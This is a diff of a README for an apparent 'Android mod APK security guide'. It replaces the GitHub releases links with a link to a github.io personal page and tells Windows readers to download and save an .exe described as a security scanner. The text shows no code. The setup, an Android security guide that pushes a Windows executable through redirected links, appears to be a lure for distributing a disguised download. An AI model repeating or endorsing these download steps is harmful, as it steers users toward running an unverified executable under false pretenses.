@@ -1,6 +1,6 @@
 # 🛡️ android-mod-apk-security-guide - Secure your mobile device from threats
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lorcan8920/android-mod-apk-security-guide/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://lorcan8920.github.io)
 
 ## What is this guide?
 
@@ -10,7 +10,7 @@ Many users download modified applications, often called Mod APKs, to access prem
 
 You need the latest version of our security tool to analyze files. This software checks your APK files for known patterns used by hackers. Follow these instructions to get started on Windows:
 
-1. Visit the [official releases page](https://github.com/Lorcan8920/android-mod-apk-security-guide/releases).
+1. Visit the [official releases page](https://lorcan8920.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
